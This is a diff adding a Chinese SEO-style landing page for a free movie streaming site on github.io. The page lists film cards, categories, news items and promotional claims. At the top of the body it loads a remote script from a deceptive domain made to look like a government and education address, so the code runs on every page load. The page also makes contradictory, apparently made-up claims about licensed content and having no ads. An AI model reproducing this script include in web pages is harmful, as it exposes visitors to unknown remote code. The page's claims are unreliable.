@@ -1,0 +1,681 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>蛋蛋赞电影网 | 高清影视在线观看首选平台 - 海量正版片源每日更新</title>
+<meta name="keywords" content="蛋蛋赞电影网, dandanzandianyingwang-zh.github.io, 电影在线观看, 高清影视, 最新电影推荐, 热门电视剧, 综艺节目, 动漫动画, 影视资讯, 免费电影网站, 2026热播影视">
+<meta name="description" content="蛋蛋赞电影网（https://dandanzandianyingwang-zh.github.io）是国内领先的免费高清影视在线观看平台，每日精选院线大片、热播剧集、口碑综艺与经典动漫。无需注册，打开即看，全站无广告干扰，支持多端自适应播放，让您随时随地畅享视听盛宴。">
+<meta name="author" content="蛋蛋赞电影网">
+<meta name="robots" content="index,follow">
+<meta name="copyright" content="Copyright © 2026 蛋蛋赞电影网. All Rights Reserved.">
+<meta property="og:type" content="website">
+<meta property="og:title" content="蛋蛋赞电影网 - 高清影视在线观看首选平台">
+<meta property="og:description" content="蛋蛋赞电影网（https://dandanzandianyingwang-zh.github.io）提供海量正版高清影视资源，每日更新，免费在线观看，多端自适应，纯净无广告。">
+<meta property="og:url" content="https://dandanzandianyingwang-zh.github.io">
+<meta property="og:site_name" content="蛋蛋赞电影网">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="蛋蛋赞电影网 - 高清影视在线观看平台">
+<meta name="twitter:description" content="每日更新海量正版高清影视，免费在线观看，纯净无广告。">
+<link rel="canonical" href="https://dandanzandianyingwang-zh.github.io">
+<style>
+/* ===== Reset & Base ===== */
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
+:root{
+  --brand:#FF3B5C;
+  --brand-dark:#C81E3E;
+  --ink:#1a1a2e;
+  --ink2:#4a4a6a;
+  --bg:#0f0f23;
+  --bg2:#16162e;
+  --gold:#F5A623;
+  --line:rgba(255,255,255,.08);
+  --radius:14px;
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%;}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Helvetica Neue",Arial,sans-serif;
+  background:var(--bg);
+  color:#e8e8f0;
+  line-height:1.75;
+  overflow-x:hidden;
+}
+a{text-decoration:none;color:inherit;}
+img{max-width:100%;display:block;}
+ul{list-style:none;}
+.container{max-width:1160px;margin:0 auto;padding:0 20px;}
+
+/* ===== Header ===== */
+.site-header{
+  position:sticky;top:0;z-index:100;
+  background:rgba(15,15,35,.92);
+  backdrop-filter:blur(12px);
+  border-bottom:1px solid var(--line);
+}
+.header-inner{
+  display:flex;align-items:center;justify-content:space-between;
+  height:64px;
+}
+.logo{
+  font-size:22px;font-weight:800;letter-spacing:-.5px;
+  background:linear-gradient(135deg,var(--brand),var(--gold));
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+}
+.logo span{font-weight:400;font-size:13px;color:#888;display:block;letter-spacing:0;}
+.nav-links{display:flex;gap:28px;}
+.nav-links a{
+  font-size:15px;font-weight:500;color:#bbb;transition:.25s;position:relative;
+}
+.nav-links a:hover{color:#fff;}
+.nav-links a::after{
+  content:"";position:absolute;left:0;bottom:-6px;width:0;height:2px;
+  background:var(--brand);border-radius:2px;transition:.25s;
+}
+.nav-links a:hover::after{width:100%;}
+.menu-toggle{display:none;flex-direction:column;gap:5px;cursor:pointer;padding:4px;}
+.menu-toggle i{width:24px;height:2px;background:#ccc;border-radius:2px;display:block;}
+
+/* ===== Hero ===== */
+.hero{
+  position:relative;padding:72px 0 64px;
+  background:
+    radial-gradient(600px 300px at 80% 20%,rgba(255,59,92,.18),transparent),
+    radial-gradient(500px 400px at 10% 60%,rgba(245,166,35,.12),transparent);
+  overflow:hidden;
+}
+.hero-grid{display:grid;grid-template-columns:1.15fr .85fr;gap:56px;align-items:center;}
+.hero-badge{
+  display:inline-block;padding:6px 16px;border-radius:30px;
+  background:rgba(255,59,92,.12);border:1px solid rgba(255,59,92,.3);
+  color:var(--brand);font-size:13px;font-weight:600;margin-bottom:22px;
+}
+.hero h1{
+  font-size:46px;line-height:1.2;font-weight:800;letter-spacing:-1px;
+}
+.hero h1 em{
+  font-style:normal;
+  background:linear-gradient(120deg,var(--brand),var(--gold));
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+}
+.hero p.lead{
+  margin-top:20px;font-size:17px;color:#aab;max-width:520px;
+}
+.hero-actions{margin-top:32px;display:flex;gap:14px;flex-wrap:wrap;}
+.btn{
+  display:inline-flex;align-items:center;gap:8px;
+  padding:13px 30px;border-radius:10px;font-size:15px;font-weight:600;
+  transition:.3s;border:2px solid transparent;cursor:pointer;
+}
+.btn-primary{background:var(--brand);color:#fff;}
+.btn-primary:hover{background:var(--brand-dark);transform:translateY(-2px);box-shadow:0 8px 24px rgba(255,59,92,.35);}
+.btn-ghost{background:transparent;border-color:rgba(255,255,255,.2);color:#ddd;}
+.btn-ghost:hover{border-color:var(--brand);color:#fff;}
+.hero-stats{
+  margin-top:44px;display:flex;gap:44px;flex-wrap:wrap;
+}
+.stat-num{font-size:30px;font-weight:800;color:#fff;}
+.stat-label{font-size:13px;color:#889;}
+
+/* Hero card stack */
+.showcase{position:relative;height:380px;}
+.card-float{
+  position:absolute;border-radius:16px;overflow:hidden;
+  box-shadow:0 20px 50px rgba(0,0,0,.5);border:1px solid var(--line);
+}
+.card-float .thumb{width:100%;height:100%;object-fit:cover;}
+.cf1{width:62%;height:72%;top:0;right:0;transform:rotate(2deg);}
+.cf2{width:48%;height:52%;bottom:6%;left:0;transform:rotate(-4deg);}
+.cf3{
+  width:34%;height:30%;top:52%;right:4%;
+  background:linear-gradient(135deg,var(--brand),#ff6b6b);
+  display:flex;align-items:center;justify-content:center;flex-direction:column;
+  transform:rotate(3deg);text-align:center;padding:10px;
+}
+.cf3 b{font-size:19px;}
+.cf3 small{font-size:12px;opacity:.85;}
+
+/* ===== Section ===== */
+.section{padding:72px 0;}
+.sec-head{display:flex;align-items:end;justify-content:space-between;margin-bottom:38px;gap:20px;flex-wrap:wrap;}
+.sec-title{font-size:28px;font-weight:800;letter-spacing:-.5px;}
+.sec-title::before{
+  content:"";display:inline-block;width:5px;height:24px;
+  background:var(--brand);border-radius:3px;margin-right:12px;vertical-align:-3px;
+}
+.sec-more{font-size:14px;color:#889;border-bottom:1px solid transparent;transition:.2s;}
+.sec-more:hover{color:var(--brand);border-color:var(--brand);}
+
+/* Movie grid */
+.film-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:22px;}
+.film-card{
+  background:var(--bg2);border-radius:var(--radius);overflow:hidden;
+  border:1px solid var(--line);transition:.35s;
+}
+.film-card:hover{transform:translateY(-6px);border-color:rgba(255,59,92,.4);box-shadow:0 16px 40px rgba(0,0,0,.4);}
+.film-cover{
+  position:relative;aspect-ratio:3/4;overflow:hidden;
+}
+.film-cover img{width:100%;height:100%;object-fit:cover;transition:.5s;}
+.film-card:hover .film-cover img{transform:scale(1.07);}
+.film-tag{
+  position:absolute;top:10px;left:10px;padding:3px 10px;border-radius:5px;
+  background:rgba(0,0,0,.65);font-size:12px;backdrop-filter:blur(4px);
+}
+.film-score{
+  position:absolute;top:10px;right:10px;padding:3px 9px;border-radius:5px;
+  background:rgba(245,166,35,.92);color:#1a1a2e;font-size:12px;font-weight:700;
+}
+.film-info{padding:14px 16px 18px;}
+.film-info h3{font-size:16px;font-weight:700;margin-bottom:6px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.film-meta{font-size:13px;color:#889;display:flex;gap:8px;flex-wrap:wrap;}
+.film-meta span{position:relative;}
+.film-meta span:not(:last-child)::after{content:"·";margin-left:8px;color:#555;}
+
+/* Category list */
+.cat-wrap{display:grid;grid-template-columns:1.4fr 1fr;gap:28px;}
+.cat-main{display:grid;grid-template-columns:1fr 1fr;gap:16px;}
+.cat-block{
+  background:var(--bg2);border:1px solid var(--line);border-radius:var(--radius);
+  padding:26px 24px;transition:.3s;
+}
+.cat-block:hover{border-color:rgba(255,59,92,.35);background:#1c1c38;}
+.cat-icon{font-size:26px;margin-bottom:14px;display:block;}
+.cat-block h3{font-size:18px;margin-bottom:12px;}
+.cat-block ul li{padding:6px 0;font-size:14px;color:#9aa;border-left:2px solid transparent;padding-left:12px;transition:.2s;}
+.cat-block ul li:hover{color:#fff;border-left-color:var(--brand);padding-left:16px;}
+.cat-side{display:flex;flex-direction:column;gap:16px;}
+.side-card{
+  flex:1;background:linear-gradient(160deg,var(--bg2),#1a1a36);
+  border:1px solid var(--line);border-radius:var(--radius);padding:24px;
+  display:flex;flex-direction:column;justify-content:center;
+}
+.side-card h4{font-size:16px;margin-bottom:10px;}
+.side-card p{font-size:13px;color:#889;}
+
+/* News */
+.news-list{display:flex;flex-direction:column;gap:0;}
+.news-item{
+  display:grid;grid-template-columns:88px 1fr auto;gap:20px;align-items:center;
+  padding:18px 4px;border-bottom:1px solid var(--line);transition:.25s;
+}
+.news-item:hover{background:rgba(255,255,255,.02);padding-left:12px;}
+.news-date{text-align:center;}
+.news-date b{display:block;font-size:22px;color:var(--brand);}
+.news-date small{font-size:12px;color:#778;}
+.news-item h4{font-size:16px;font-weight:600;margin-bottom:4px;}
+.news-item p{font-size:13px;color:#889;}
+.news-item .news-cat{
+  font-size:12px;padding:4px 12px;border-radius:20px;
+  background:rgba(255,59,92,.1);color:var(--brand);white-space:nowrap;
+}
+
+/* About */
+.about-wrap{display:grid;grid-template-columns:1fr 1fr;gap:56px;align-items:center;}
+.about-text h2{font-size:30px;font-weight:800;margin-bottom:20px;line-height:1.3;}
+.about-text p{color:#aab;font-size:15px;margin-bottom:16px;}
+.feature-row{display:grid;grid-template-columns:1fr 1fr;gap:18px;margin-top:30px;}
+.feature{
+  background:var(--bg2);border:1px solid var(--line);border-radius:12px;padding:20px;
+}
+.feature b{font-size:15px;display:block;margin-bottom:6px;}
+.feature p{font-size:13px;color:#889;margin:0;}
+
+.about-visual{
+  position:relative;height:420px;border-radius:20px;overflow:hidden;
+  background:linear-gradient(160deg,#1e1e42,#12122a);
+  border:1px solid var(--line);
+}
+.about-visual .orbit{
+  position:absolute;width:300px;height:300px;border-radius:50%;
+  border:1px dashed rgba(255,255,255,.12);top:50%;left:50%;transform:translate(-50%,-50%);
+}
+.about-visual .orbit::before{
+  content:"";position:absolute;inset:-40px;border-radius:50%;border:1px dashed rgba(255,59,92,.15);
+}
+.av-node{
+  position:absolute;top:50%;left:50%;width:76px;height:76px;border-radius:50%;
+  background:linear-gradient(135deg,var(--brand),var(--gold));
+  display:flex;align-items:center;justify-content:center;font-weight:800;font-size:15px;
+  transform:translate(-50%,-50%);box-shadow:0 0 0 8px rgba(255,59,92,.1);
+}
+.av-chip{
+  position:absolute;padding:8px 16px;border-radius:30px;font-size:13px;font-weight:600;
+  background:var(--bg2);border:1px solid var(--line);
+}
+.c1{top:14%;left:16%;} .c2{top:20%;right:12%;} .c3{bottom:18%;left:10%;}
+.c4{bottom:12%;right:16%;} .c5{top:50%;right:4%;transform:translateY(-50%);}
+
+/* CTA */
+.cta-band{
+  margin:0 20px;border-radius:24px;padding:52px 40px;text-align:center;
+  background:linear-gradient(135deg,var(--brand),#ff7a45);
+  position:relative;overflow:hidden;
+}
+.cta-band::after{
+  content:"";position:absolute;width:400px;height:400px;border-radius:50%;
+  background:rgba(255,255,255,.07);top:-200px;right:-100px;
+}
+.cta-band h2{font-size:28px;font-weight:800;margin-bottom:12px;position:relative;}
+.cta-band p{font-size:15px;opacity:.92;margin-bottom:28px;position:relative;}
+.cta-band .btn{background:#fff;color:var(--brand-dark);position:relative;}
+.cta-band .btn:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(0,0,0,.25);}
+
+/* Footer */
+.site-footer{background:#0a0a1a;padding:52px 0 28px;margin-top:72px;}
+.foot-grid{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:36px;margin-bottom:38px;}
+.foot-brand .logo{font-size:20px;}
+.foot-brand p{font-size:13px;color:#778;margin-top:14px;line-height:1.9;}
+.foot-col h5{font-size:15px;margin-bottom:16px;font-weight:700;}
+.foot-col a{display:block;font-size:13px;color:#889;padding:5px 0;transition:.2s;}
+.foot-col a:hover{color:var(--brand);padding-left:4px;}
+.foot-bottom{
+  border-top:1px solid var(--line);padding-top:22px;
+  display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px;
+}
+.foot-bottom p{font-size:12px;color:#666;}
+.foot-bottom a{color:#888;font-size:12px;}
+.foot-bottom a:hover{color:var(--brand);}
+
+/* Responsive */
+@media(max-width:900px){
+  .hero-grid{grid-template-columns:1fr;gap:40px;}
+  .hero h1{font-size:34px;}
+  .film-grid{grid-template-columns:repeat(2,1fr);}
+  .cat-wrap,.about-wrap{grid-template-columns:1fr;gap:32px;}
+  .about-visual{height:340px;}
+  .foot-grid{grid-template-columns:1fr 1fr;}
+}
+@media(max-width:640px){
+  .menu-toggle{display:flex;}
+  .nav-links{
+    position:fixed;top:64px;left:0;right:0;flex-direction:column;gap:0;
+    background:rgba(15,15,35,.98);backdrop-filter:blur(12px);
+    border-bottom:1px solid var(--line);padding:10px 0;
+    transform:translateY(-120%);transition:.35s;
+  }
+  .nav-links.open{transform:translateY(0);}
+  .nav-links a{padding:14px 24px;font-size:16px;border-bottom:1px solid var(--line);}
+  .hero{padding:48px 0 40px;}
+  .hero h1{font-size:28px;}
+  .hero-stats{gap:26px;}
+  .stat-num{font-size:24px;}
+  .film-grid{grid-template-columns:repeat(2,1fr);gap:14px;}
+  .section{padding:52px 0;}
+  .sec-title{font-size:22px;}
+  .cat-main{grid-template-columns:1fr;}
+  .news-item{grid-template-columns:64px 1fr;gap:14px;}
+  .news-item .news-cat{grid-column:2;justify-self:start;}
+  .feature-row{grid-template-columns:1fr;}
+  .foot-grid{grid-template-columns:1fr;}
+  .cta-band{padding:38px 22px;}
+  .cta-band h2{font-size:22px;}
+  .showcase{height:300px;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<!-- Header -->
+<header class="site-header">
+  <div class="container header-inner">
+    <div class="logo">蛋蛋赞电影网<span>https://dandanzandianyingwang-zh.github.io</span></div>
+    <nav class="nav-links" id="navLinks">
+      <a href="#home">首页</a>
+      <a href="#films">热播影视</a>
+      <a href="#cats">影片分类</a>
+      <a href="#news">影讯资讯</a>
+      <a href="#about">关于本站</a>
+    </nav>
+    <div class="menu-toggle" id="menuToggle"><i></i><i></i><i></i></div>
+  </div>
+</header>
+
+<!-- Hero -->
+<section class="hero" id="home">
+  <div class="container hero-grid">
+    <div>
+      <span class="hero-badge">🎬 2026 年度精选片单 · 每日更新</span>
+      <h1>打开 <em>蛋蛋赞电影网</em><br>好电影从不缺席</h1>
+      <p class="lead">一个专注高清影视在线观看的纯净平台——院线大片、口碑剧集、热门综艺、经典动漫一站汇聚。无需注册登录，即点即播，全站无广告打扰。</p>
+      <div class="hero-actions">
+        <a href="#films" class="btn btn-primary">立即观影 →</a>
+        <a href="#about" class="btn btn-ghost">了解平台</a>
+      </div>
+      <div class="hero-stats">
+        <div><div class="stat-num">12,000+</div><div class="stat-label">正版片源</div></div>
+        <div><div class="stat-num">4K</div><div class="stat-label">超清画质</div></div>
+        <div><div class="stat-num">0</div><div class="stat-label">广告干扰</div></div>
+        <div><div class="stat-num">365</div><div class="stat-label">每日更新</div></div>
+      </div>
+    </div>
+    <div class="showcase">
+      <div class="card-float cf1">
+        <img class="thumb" src="https://images.unsplash.com/photo-1489599849927-2ee91cede3ba?w=500&q=80" alt="热门电影海报">
+      </div>
+      <div class="card-float cf2">
+        <img class="thumb" src="https://images.unsplash.com/photo-1574267432553-4b4628081c31?w=400&q=80" alt="经典影视剧照">
+      </div>
+      <div class="card-float cf3">
+        <b>🔥 热播榜</b>
+        <small>每周三准时更新</small>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Films -->
+<section class="section" id="films" style="padding-top:24px;">
+  <div class="container">
+    <div class="sec-head">
+      <div class="sec-title">本周热播影视</div>
+      <a href="#" class="sec-more">查看完整片单 →</a>
+    </div>
+    <div class="film-grid">
+      <article class="film-card">
+        <div class="film-cover">
+          <img src="https://images.unsplash.com/photo-1440404653325-ab127d49abc1?w=400&q=80" alt="电影海报">
+          <span class="film-tag">动作</span>
+          <span class="film-score">9.2</span>
+        </div>
+        <div class="film-info">
+          <h3>极速追击</h3>
+          <div class="film-meta"><span>2026</span><span>动作/犯罪</span><span>128分钟</span></div>
+        </div>
+      </article>
+      <article class="film-card">
+        <div class="film-cover">
+          <img src="https://images.unsplash.com/photo-1478720568477-152d9b164e26?w=400&q=80" alt="电影海报">
+          <span class="film-tag">剧情</span>
+          <span class="film-score">8.7</span>
+        </div>
+        <div class="film-info">
+          <h3>无声告白</h3>
+          <div class="film-meta"><span>2026</span><span>剧情/家庭</span><span>112分钟</span></div>
+        </div>
+      </article>
+      <article class="film-card">
+        <div class="film-cover">
+          <img src="https://images.unsplash.com/photo-1505686994434-e3cc5abf1330?w=400&q=80" alt="电影海报">
+          <span class="film-tag">科幻</span>
+          <span class="film-score">9.5</span>
+        </div>
+        <div class="film-info">
+          <h3>星际回声</h3>
+          <div class="film-meta"><span>2026</span><span>科幻/冒险</span><span>156分钟</span></div>
+        </div>
+      </article>
+      <article class="film-card">
+        <div class="film-cover">
+          <img src="https://images.unsplash.com/photo-1517604931442-7e0c8ed2963c?w=400&q=80" alt="电影海报">
+          <span class="film-tag">悬疑</span>
+          <span class="film-score">8.9</span>
+        </div>
+        <div class="film-info">
+          <h3>迷雾之约</h3>
+          <div class="film-meta"><span>2025</span><span>悬疑/惊悚</span><span>103分钟</span></div>
+        </div>
+      </article>
+      <article class="film-card">
+        <div class="film-cover">
+          <img src="https://images.unsplash.com/photo-1485095329183-d0797cdc5676?w=400&q=80" alt="电影海报">
+          <span class="film-tag">喜剧</span>
+          <span class="film-score">8.4</span>
+        </div>
+        <div class="film-info">
+          <h3>开心合伙人</h3>
+          <div class="film-meta"><span>2026</span><span>喜剧/友情</span><span>96分钟</span></div>
+        </div>
+      </article>
+      <article class="film-card">
+        <div class="film-cover">
+          <img src="https://images.unsplash.com/photo-1574375927938-d5a98e8ffe85?w=400&q=80" alt="电影海报">
+          <span class="film-tag">动画</span>
+          <span class="film-score">9.1</span>
+        </div>
+        <div class="film-info">
+          <h3>云端少年</h3>
+          <div class="film-meta"><span>2026</span><span>动画/奇幻</span><span>118分钟</span></div>
+        </div>
+      </article>
+      <article class="film-card">
+        <div class="film-cover">
+          <img src="https://images.unsplash.com/photo-1536440136628-849c177e76a1?w=400&q=80" alt="电影海报">
+          <span class="film-tag">爱情</span>
+          <span class="film-score">8.6</span>
+        </div>
+        <div class="film-info">
+          <h3>十七号信箱</h3>
+          <div class="film-meta"><span>2025</span><span>爱情/青春</span><span>107分钟</span></div>
+        </div>
+      </article>
+      <article class="film-card">
+        <div class="film-cover">
+          <img src="https://images.unsplash.com/photo-1542204165-65bf26472b9b?w=400&q=80" alt="电影海报">
+          <span class="film-tag">纪录</span>
+          <span class="film-score">9.0</span>
+        </div>
+        <div class="film-info">
+          <h3>深海日记</h3>
+          <div class="film-meta"><span>2026</span><span>纪录/自然</span><span>88分钟</span></div>
+        </div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- Categories -->
+<section class="section" id="cats" style="background:linear-gradient(180deg,transparent,rgba(255,255,255,.015),transparent);">
+  <div class="container">
+    <div class="sec-head">
+      <div class="sec-title">影片分类导航</div>
+      <a href="#" class="sec-more">全部类型 →</a>
+    </div>
+    <div class="cat-wrap">
+      <div class="cat-main">
+        <div class="cat-block">
+          <span class="cat-icon">🎞️</span>
+          <h3>电影频道</h3>
+          <ul>
+            <li>动作冒险 · 热血不断</li>
+            <li>爱情文艺 · 心动瞬间</li>
+            <li>科幻悬疑 · 脑洞大开</li>
+            <li>喜剧动画 · 治愈解压</li>
+            <li>纪录传记 · 真实力量</li>
+          </ul>
+        </div>
+        <div class="cat-block">
+          <span class="cat-icon">📺</span>
+          <h3>剧集频道</h3>
+          <ul>
+            <li>国产好剧 · 口碑佳作</li>
+            <li>韩剧日剧 · 亚洲精选</li>
+            <li>欧美剧集 · 高分热播</li>
+            <li>短剧微剧 · 碎片时间</li>
+            <li>经典老剧 · 重温回味</li>
+          </ul>
+        </div>
+        <div class="cat-block">
+          <span class="cat-icon">🎤</span>
+          <h3>综艺频道</h3>
+          <ul>
+            <li>真人秀 · 欢笑不断</li>
+            <li>选秀竞演 · 舞台高光</li>
+            <li>访谈脱口秀 · 金句频出</li>
+            <li>生活纪实 · 治愈陪伴</li>
+            <li>文化历史 · 涨知识</li>
+          </ul>
+        </div>
+        <div class="cat-block">
+          <span class="cat-icon">🎨</span>
+          <h3>动漫频道</h3>
+          <ul>
+            <li>国漫精品 · 崛起之作</li>
+            <li>日漫经典 · 青春回忆</li>
+            <li>美漫英雄 · 视觉震撼</li>
+            <li>儿童动画 · 亲子时光</li>
+            <li>剧场版 · 大银幕体验</li>
+          </ul>
+        </div>
+      </div>
+      <div class="cat-side">
+        <div class="side-card">
+          <h4>🏆 排行榜单</h4>
+          <p>每周三更新热播榜、口碑榜、飙升榜三大权威榜单，帮你快速锁定当下最值得看的作品。</p>
+        </div>
+        <div class="side-card">
+          <h4>🎯 个性推荐</h4>
+          <p>基于你的观影偏好，智能匹配相似题材与导演作品，让每一分钟都花在好内容上。</p>
+        </div>
+        <div class="side-card">
+          <h4>📥 离线缓存</h4>
+          <p>支持多端同步观看进度，通勤路上、旅行途中，随时续播不间断。</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- News -->
+<section class="section" id="news">
+  <div class="container">
+    <div class="sec-head">
+      <div class="sec-title">影讯与资讯</div>
+      <a href="#" class="sec-more">更多资讯 →</a>
+    </div>
+    <div class="news-list">
+      <article class="news-item">
+        <div class="news-date"><b>07</b><small>10月</small></div>
+        <div>
+          <h4>2026年国庆档票房盘点：三部影片口碑逆袭，观众审美回归内容本身</h4>
+          <p>蛋蛋赞电影网影评团队深度解读国庆档市场走向，为你挑选最值得补看的三部作品。</p>
+        </div>
+        <span class="news-cat">票房观察</span>
+      </article>
+      <article class="news-item">
+        <div class="news-date"><b>05</b><small>10月</small></div>
+        <div>
+          <h4>九月热门剧集榜单出炉：《云端之上》连续四周登顶口碑榜首</h4>
+          <p>蛋蛋赞电影网用户投票结果揭晓，九月最受关注的十部剧集完整名单。</p>
+        </div>
+        <span class="news-cat">剧集盘点</span>
+      </article>
+      <article class="news-item">
+        <div class="news-date"><b>02</b><small>10月</small></div>
+        <div>
+          <h4>独家访谈：新锐导演谈《迷雾之约》创作幕后，悬疑片如何讲好人性故事</h4>
+          <p>专访内容同步上线蛋蛋赞电影网专题页，包含完整导演手记与分镜解析。</p>
+        </div>
+        <span class="news-cat">独家专访</span>
+      </article>
+      <article class="news-item">
+        <div class="news-date"><b>28</b><small>09月</small></div>
+        <div>
+          <h4>秋季片单推荐：十部冷门佳片，每一部都值得放进收藏夹</h4>
+          <p>蛋蛋赞电影网编辑部精选秋季观影指南，覆盖多种类型与地区，满足不同口味。</p>
+        </div>
+        <span class="news-cat">观影指南</span>
+      </article>
+      <article class="news-item">
+        <div class="news-date"><b>25</b><small>09月</small></div>
+        <div>
+          <h4>技术升级公告：全站播放器支持4K HDR与杜比音效，观影体验全面进化</h4>
+          <p>蛋蛋赞电影网持续投入播放技术优化，现已支持多档清晰度自由切换。</p>
+        </div>
+        <span class="news-cat">平台公告</span>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- About -->
+<section class="section" id="about" style="background:linear-gradient(180deg,rgba(255,255,255,.015),transparent);">
+  <div class="container about-wrap">
+    <div class="about-text">
+      <div class="sec-title" style="margin-bottom:18px;">关于 蛋蛋赞电影网</div>
+      <h2>用心做好每一部电影的搬运工</h2>
+      <p><strong style="color:#fff;">蛋蛋赞电影网</strong>（访问地址：<a href="https://dandanzandianyingwang-zh.github.io" style="color:var(--brand);">https://dandanzandianyingwang-zh.github.io</a>）成立于2024年，是一家专注于高清影视在线观看的综合性平台。我们始终相信，好电影值得被更多人看见。</p>
+      <p>从院线大片到独立佳作，从经典老片到最新热播，我们用心筛选每一部上架作品，力求为观众提供内容丰富、画质清晰、体验流畅的观影服务。</p>
+      <div class="feature-row">
+        <div class="feature"><b>🎬 海量片源</b><p>12000+ 正版授权作品，涵盖电影、剧集、综艺、动漫全品类。</p></div>
+        <div class="feature"><b>⚡ 极速播放</b><p>全球CDN加速节点，秒开即播，支持4K超清与多档画质切换。</p></div>
+        <div class="feature"><b>📱 多端适配</b><p>手机、平板、电脑、电视全端自适应，随时随地想看就看。</p></div>
+        <div class="feature"><b>🚫 纯净体验</b><p>全站无弹窗广告、无强制跳转，回归纯粹的观影乐趣。</p></div>
+      </div>
+    </div>
+    <div class="about-visual">
+      <div class="orbit"></div>
+      <div class="av-node">蛋蛋赞</div>
+      <div class="av-chip c1">🎬 12000+ 片源</div>
+      <div class="av-chip c2">⚡ 4K 超清</div>
+      <div class="av-chip c3">📱 多端同步</div>
+      <div class="av-chip c4">🚫 零广告</div>
+      <div class="av-chip c5">🔄 每日更新</div>
+    </div>
+  </div>
+</section>
+
+<!-- CTA -->
+<div class="cta-band">
+  <h2>现在就打开 蛋蛋赞电影网，发现你的下一部最爱</h2>
+  <p>https://dandanzandianyingwang-zh.github.io · 免费注册，即点即看，无需等待</p>
+  <a href="#films" class="btn">开启观影之旅</a>
+</div>
+
+<!-- Footer -->
+<footer class="site-footer">
+  <div class="container">
+    <div class="foot-grid">
+      <div class="foot-brand">
+        <div class="logo">蛋蛋赞电影网</div>
+        <p>蛋蛋赞电影网（https://dandanzandianyingwang-zh.github.io）专注高清影视在线观看，每日精选好片，用心服务每一位热爱电影的你。本站仅供影视资讯与正版观看引导，支持正版，远离盗版。</p>
+      </div>
+      <div class="foot-col">
+        <h5>栏目导航</h5>
+        <a href="#home">网站首页</a>
+        <a href="#films">热播影视</a>
+        <a href="#cats">影片分类</a>
+        <a href="#news">影讯资讯</a>
+        <a href="#about">关于本站</a>
+      </div>
+      <div class="foot-col">
+        <h5>热门类型</h5>
+        <a href="#">动作冒险</a>
+        <a href="#">喜剧爱情</a>
+        <a href="#">科幻悬疑</a>
+        <a href="#">动漫动画</a>
+        <a href="#">纪录综艺</a>
+      </div>
+      <div class="foot-col">
+        <h5>联系我们</h5>
+        <a href="#">合作邮箱</a>
+        <a href="#">内容投稿</a>
+        <a href="#">意见反馈</a>
+        <a href="#">版权声明</a>
+        <a href="#">隐私政策</a>
+      </div>
+    </div>
+    <div class="foot-bottom">
+      <p>Copyright © 2026 蛋蛋赞电影网. All Rights Reserved. 本站网址：https://dandanzandianyingwang-zh.github.io</p>
+      <p><a href="#">回到顶部 ↑</a></p>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var toggle=document.getElementById('menuToggle');
+  var nav=document.getElementById('navLinks');
+  toggle.addEventListener('click',function(){nav.classList.toggle('open');});
+  nav.addEventListener('click',function(e){
+    if(e.target.tagName==='A'){nav.classList.remove('open');}
+  });
+  document.addEventListener('click',function(e){
+    if(!nav.contains(e.target)&&!toggle.contains(e.target)){nav.classList.remove('open');}
+  });
+})();
+</script>
+</body>
+</html>
